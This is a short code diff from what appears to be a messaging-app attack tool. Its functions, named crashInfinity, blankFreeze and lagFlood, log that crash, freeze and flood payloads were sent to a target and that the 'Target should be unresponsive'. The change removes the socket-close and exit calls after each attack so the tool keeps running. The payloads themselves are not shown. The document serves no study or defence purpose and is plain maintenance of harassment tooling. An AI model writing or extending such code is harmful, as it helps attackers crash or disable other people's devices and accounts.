@@ -278,9 +278,7 @@ async function crashInfinity(target, sock) {
         });
 
         console.log(`[✅] Payload successfully relayed to ${target}`);
-        
-        await sock.ws.close();
-        process.exit(0);
+
 
     } catch (err) {
         console.error(`[❌] Failed to send payload: ${err.message}`);
@@ -317,12 +315,7 @@ async function blankFreeze(target, sock) {
         });
 
         console.log(chalk.green(`[✅] Blank-Freeze Sent! Target should be unresponsive.`));
-        setTimeout(async () => {
-            await sock.ws.close();
-            process.exit(0);
-        }, 2000);
-
-    } catch (err) {
+   } catch (err) {
         console.log(chalk.red(`[❌] Error: ${err.message}`));
     }
 }
@@ -365,11 +358,6 @@ async function lagFlood(target, sock) {
         });
 
         console.log(chalk.cyan(`[✅] Lag-Flood successfully deployed to ${target}`));
-        setTimeout(async () => {
-            await sock.ws.close();
-            process.exit(0);
-        }, 1500);
-
     } catch (err) {
         console.log(chalk.red(`[❌] Flood Failed: ${err.message}`));
     }
